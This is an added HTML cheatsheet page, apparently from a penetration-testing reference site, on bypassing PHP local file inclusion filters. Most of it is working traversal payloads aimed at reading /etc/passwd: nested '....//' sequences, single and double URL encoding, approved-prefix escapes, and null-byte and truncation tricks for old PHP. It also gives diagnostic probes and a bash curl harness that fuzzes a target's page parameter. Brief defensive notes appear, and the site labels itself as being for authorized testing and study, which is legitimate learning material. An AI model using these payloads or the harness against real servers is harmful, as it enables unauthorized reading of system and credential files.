@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Filter bypasses · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Inclusion</nav><h1>Filter bypasses</h1><p class="cx-lede">Defeating LFI input filters - non-recursive sanitization, URL encoding, approved-path checks, path truncation, and null-byte injection.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1027</span><span class="cx-tag">D3FEND D3-FA</span><span class="cx-tag">IMPACT FileRead</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When <code>../</code> is stripped or the path is restricted to an allowed directory, several bypasses defeat the filter:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Non-recursive ../ strip - use a payload that decomposes to ../ after one pass
+....//....//....//....//etc/passwd
+..././..././..././etc/passwd
+
+# URL-encoding when raw . or / are blocked
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd      # ../../../etc/passwd encoded
+%252e%252e%252f...                            # double-encoded for double-decoding apps
+
+# Approved-path check - start with the approved prefix, then traverse out
+./languages/../../../../etc/passwd
+/var/www/html/uploads/../../../etc/passwd
+
+# Old PHP (≤5.3) only - null-byte injection truncates appended extension
+?page=/etc/passwd%00
+
+# Old PHP (≤5.3) only - path truncation
+?page=non_existent/../../etc/passwd/.................................. (4096+ chars)</code></pre></figure>
+<p>Success indicator: file contents in the response despite the filter being in place.</p>
+<h2 id="non-recursive-strip">Non-recursive <code>../</code> strip</h2>
+<p>The most common LFI filter - <code>str_replace</code> (or equivalent) removes all <code>../</code> substrings from the input:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">$page = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $_GET[&#x27;page&#x27;]);
+include(&quot;./languages/&quot; . $page);</code></pre></figure>
+<p>The fix is wrong because <code>str_replace</code> runs once. A payload constructed so that <em>after one pass of stripping <code>../</code></em>, the remaining string still contains <code>../</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>input:    ....//....//....//etc/passwd
+strip:    ..  /..  /..  /etc/passwd      ← the inner ../ is removed
+result:   ../../../etc/passwd            ← traversal restored</code></pre></figure>
+<p>The same logic applies to several payload variants:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>....//etc/passwd                            ← ../ inside `....//`
+..././etc/passwd                            ← ../ inside `..././`
+....\/etc/passwd                            ← escaped slash variant
+....////etc/passwd                          ← extra slashes</code></pre></figure>
+<p>The principle: nest the forbidden sequence inside a longer pattern that resolves to the forbidden sequence after one filter pass.</p>
+<h3 id="worked-example">Worked example</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=....//....//....//....//etc/passwd</code></pre></figure>
+<p>After <code>str_replace('../', '', ...)</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>....//....//....//....//etc/passwd
+  ↓ first ../ removed (from `....//` = ..  + ../)
+  ↓ but the filter operates substring-by-substring, leaving `../` in each
+../../../../etc/passwd</code></pre></figure>
+<p>The exact behavior depends on the filter implementation - some replace all instances in parallel, some iterate. Test the variants and observe the response.</p>
+<h3 id="defending-against-this">Defending against this</h3>
+<p>Recursive sanitization: loop the <code>str_replace</code> until the string stops changing:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">while (strpos($page, &#x27;../&#x27;) !== false) {
+    $page = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $page);
+}</code></pre></figure>
+<p>This catches <code>....//</code> because removing the inner <code>../</code> leaves <code>../</code>, which the next iteration removes. Most production filters do this; the bypass works against the naive single-pass variant.</p>
+<h2 id="url-encoding">URL encoding</h2>
+<p>Some filters operate on the raw URL parameter before URL-decoding happens. Encoding the traversal characters defeats the string match:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>../              →  %2e%2e%2f
+../../           →  %2e%2e%2f%2e%2e%2f
+/etc/passwd      →  %2f%65%74%63%2f%70%61%73%73%77%64</code></pre></figure>
+<p>Full encoded path:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></pre></figure>
+<p>The application receives this, the filter sees <code>%2e%2e%2f...</code> (no literal <code>../</code>), passes the input through, and then PHP's URL-decoding before <code>include()</code> restores the <code>../</code>. Bug fires.</p>
+<h3 id="encoding-only-whats-necessary">Encoding only what's necessary</h3>
+<p>Some apps URL-decode partially or check only specific characters. Try encoding just the dots:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%2e%2e/../etc/passwd                         # only first dots encoded
+..%2f..%2f..%2fetc/passwd                    # slashes encoded</code></pre></figure>
+<p>If the filter is encoded-character-specific, the right encoding-mix will get through.</p>
+<h3 id="double-encoding">Double encoding</h3>
+<p>When the application URL-decodes twice (sometimes by accident - once at the web server, once at the app framework), double-encoding survives the first decode:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%252e%252e%252f                              # %25 = %, so this decodes to %2e%2e%2f, then to ../</code></pre></figure>
+<p>Full payload:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</code></pre></figure>
+<p>Double-decoding behavior is application-specific - test both single and double encoding when filtering is suspected.</p>
+<h3 id="defending-against-this_1">Defending against this</h3>
+<p>Decode-then-filter, not filter-then-decode. Modern frameworks do the right thing by default; custom filters often don't.</p>
+<h2 id="approved-path-filters">Approved-path filters</h2>
+<p>A more sophisticated filter checks that the input begins with an allowed directory:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">if (preg_match(&#x27;/^\.\/languages\/.+$/&#x27;, $_GET[&#x27;page&#x27;])) {
+    include($_GET[&#x27;page&#x27;]);
+} else {
+    die(&#x27;Illegal path specified!&#x27;);
+}</code></pre></figure>
+<p>The check passes the input through unchanged if it starts with <code>./languages/</code>. The bypass: start with the approved prefix, then use traversal to escape it:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=./languages/../../../../etc/passwd</code></pre></figure>
+<p>The regex sees <code>./languages/</code> at the start - pass. The filesystem resolves <code>./languages/../../../../etc/passwd</code> to <code>/etc/passwd</code> - bug fires.</p>
+<h3 id="finding-the-approved-path">Finding the approved path</h3>
+<p>When the application doesn't tell you what the approved path is, infer it:</p>
+<ul>
+<li>Look at normal URLs the app uses - <code>?page=languages/en.php</code> tells you the prefix</li>
+<li>Try common patterns: <code>./templates/</code>, <code>./views/</code>, <code>./includes/</code>, <code>./pages/</code>, <code>./assets/</code></li>
+<li>Brute force via parameter fuzzing - the app's response tells you when the prefix is right</li>
+</ul>
+<h3 id="combined-with-other-filters">Combined with other filters</h3>
+<p>Approved-path checks are often combined with the <code>../</code> strip. Stack the bypasses:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=./languages/....//....//....//....//etc/passwd</code></pre></figure>
+<p>The approved-path check passes (starts with <code>./languages/</code>), the <code>../</code> strip leaves <code>../</code> behind, the filesystem walks out, the file gets read.</p>
+<h2 id="path-truncation-old-php-only">Path truncation (old PHP only)</h2>
+<p>In PHP versions before 5.3, strings had a max length of 4096 characters. Anything beyond was silently truncated. Combined with PHP's lenient path resolution (collapsing <code>/./</code> and trailing <code>/.</code>), this allowed bypassing appended extensions:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">include($_GET[&#x27;page&#x27;] . &quot;.php&quot;);</code></pre></figure>
+<p>The payload:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=non_existent/../../../etc/passwd/.[./ repeated until total length &gt; 4096]</code></pre></figure>
+<p>After truncation:
+- Concatenated string: <code>non_existent/../../../etc/passwd/././././...[4096 chars total].php</code>
+- Truncated at 4096: <code>...etc/passwd/././.</code> (the <code>.php</code> falls off)
+- PHP collapses <code>/./</code> repetitions: <code>/etc/passwd</code></p>
+<p>Generate the payload:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo -n &quot;non_existent/../../../etc/passwd/&quot; &amp;&amp; for i in {1..2048}; do echo -n &quot;./&quot;; done</code></pre></figure>
+<h3 id="why-this-doesnt-work-on-modern-php">Why this doesn't work on modern PHP</h3>
+<p>PHP 5.3+ relaxed the 4096-char limit and changed how <code>realpath()</code> handles excessive <code>/./</code> sequences. Path truncation is essentially dead against any maintained system; documented here for completeness against legacy targets.</p>
+<p>The "non-existent prefix" trick is also no longer required on modern PHP - PHP used to require the path to exist for canonicalization, which the leading non-existent segment satisfied via PHP's lenient resolution. Modern PHP doesn't require this.</p>
+<h2 id="null-byte-injection-very-old-php-only">Null-byte injection (very old PHP only)</h2>
+<p>PHP versions before 5.3.4 treated null bytes (<code>\0</code>, <code>%00</code> URL-encoded) as string terminators when passed to filesystem functions:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">include($_GET[&#x27;page&#x27;] . &quot;.php&quot;);</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/etc/passwd%00</code></pre></figure>
+<p>The concatenation produces <code>/etc/passwd\0.php</code>. PHP's filesystem layer used C-style strings internally and stopped reading at the null byte - the <code>.php</code> was discarded, the file loaded was <code>/etc/passwd</code>.</p>
+<h3 id="why-this-doesnt-work-anymore">Why this doesn't work anymore</h3>
+<p>PHP 5.3.4 (released 2010) explicitly rejects null bytes in filenames. Every supported PHP version refuses null-byte payloads. The technique is documented for legacy systems running very old PHP.</p>
+<h2 id="combining-bypasses">Combining bypasses</h2>
+<p>Real filters often combine multiple defenses. Combine the bypasses correspondingly:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># str_replace + URL-encoding + approved path
+?page=./languages/....//....//....//....//etc%2fpasswd
+
+# Approved path + double-encoding
+?page=./languages/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+
+# Recursive strip-resistant + approved path + appended extension
+# → use a wrapper instead - see /codex/web/lfi/wrappers/</code></pre></figure>
+<p>When stacking, start with the minimum complexity and add only what's needed. A diff between "what gets through unchanged" and "what gets stripped" tells you what each layer of the filter does.</p>
+<h2 id="diagnostic-whats-the-filter-doing">Diagnostic - what's the filter doing?</h2>
+<p>Five probes that map common filter behaviors:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1. ?page=/etc/passwd
+   → If this works, no traversal-blocking filter at all
+
+2. ?page=../etc/passwd
+   → If this works without the `../`, simple replace is happening
+
+3. ?page=....//etc/passwd
+   → If this works, single-pass strip is the filter type
+
+4. ?page=%2e%2e%2fetc/passwd
+   → If this works, raw-character check (decoded earlier in the pipeline)
+
+5. ?page=./languages/../etc/passwd
+   → If this works (or with extra `../`), approved-path check is in use</code></pre></figure>
+<p>The combination of which work and which fail identifies the filter precisely.</p>
+<h2 id="filter-bypass-test-harness">Filter-bypass test harness</h2>
+<p>For systematic testing against an unknown filter:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">PAYLOADS=(
+    &#x27;/etc/passwd&#x27;
+    &#x27;../etc/passwd&#x27;
+    &#x27;../../etc/passwd&#x27;
+    &#x27;../../../../etc/passwd&#x27;
+    &#x27;../../../../../../etc/passwd&#x27;
+    &#x27;....//etc/passwd&#x27;
+    &#x27;....//....//....//etc/passwd&#x27;
+    &#x27;..././etc/passwd&#x27;
+    &#x27;..\../etc/passwd&#x27;
+    &#x27;%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&#x27;
+    &#x27;%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&#x27;
+    &#x27;/etc/passwd%00&#x27;
+    &#x27;/etc/passwd%00.php&#x27;
+    &#x27;./languages/../../../etc/passwd&#x27;
+    &#x27;./languages/....//....//....//etc/passwd&#x27;
+)
+
+for p in &quot;${PAYLOADS[@]}&quot;; do
+    encoded=$(python3 -c &quot;import urllib.parse; print(urllib.parse.quote(&#x27;$p&#x27;, safe=&#x27;&#x27;))&quot;)
+    response=$(curl -s &quot;https://target.example.com/?page=$encoded&quot;)
+    if echo &quot;$response&quot; | grep -q &quot;root:x:0:0&quot;; then
+        echo &quot;[+] HIT: $p&quot;
+    fi
+done</code></pre></figure>
+<p>Adapt the success-check (<code>grep -q "root:x:0:0"</code>) to whatever signal works for the target file.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Filter bypasses degrade gracefully across PHP versions.</strong> The non-recursive strip and URL-encoding bypasses work on all PHP versions. Path truncation only works on PHP ≤5.3. Null-byte only works on PHP ≤5.3.4. When testing, try modern attacks first.</li>
+<li><strong>The non-recursive <code>../</code> filter is shockingly common.</strong> Many custom filters got written by developers who tested with the obvious <code>../</code> payload, observed it being stripped, declared victory, and moved on. The <code>....//</code> variant frequently works.</li>
+<li><strong>WAFs handle the obvious bypasses.</strong> Commercial WAFs catch <code>../</code>, <code>%2e%2e</code>, and most <code>....//</code>-style payloads in default rulesets. Application-layer filters often don't. The bypass that defeats a WAF and the bypass that defeats an in-app filter are usually different.</li>
+<li><strong>Combining traversal with <a href="../php-filters/index.html">PHP filters</a> is the next step.</strong> Once traversal works, the appended-extension constraint is still in play - use <code>php://filter/resource=...</code> to read source code of <code>.php</code> files.</li>
+</ul>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>When a filter blocks everything you've tried but the parameter clearly affects something, try wrappers next. The PHP-wrapper paths (<code>php://filter</code>, <code>data://</code>, <code>expect://</code>, <code>php://input</code>) frequently bypass filters that are looking for path-traversal patterns - wrappers don't contain <code>../</code> at all.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../basic-lfi/index.html">Previous: Basic LFI</a><a class="cx-next" href="../php-filters/index.html">Next: PHP filters</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
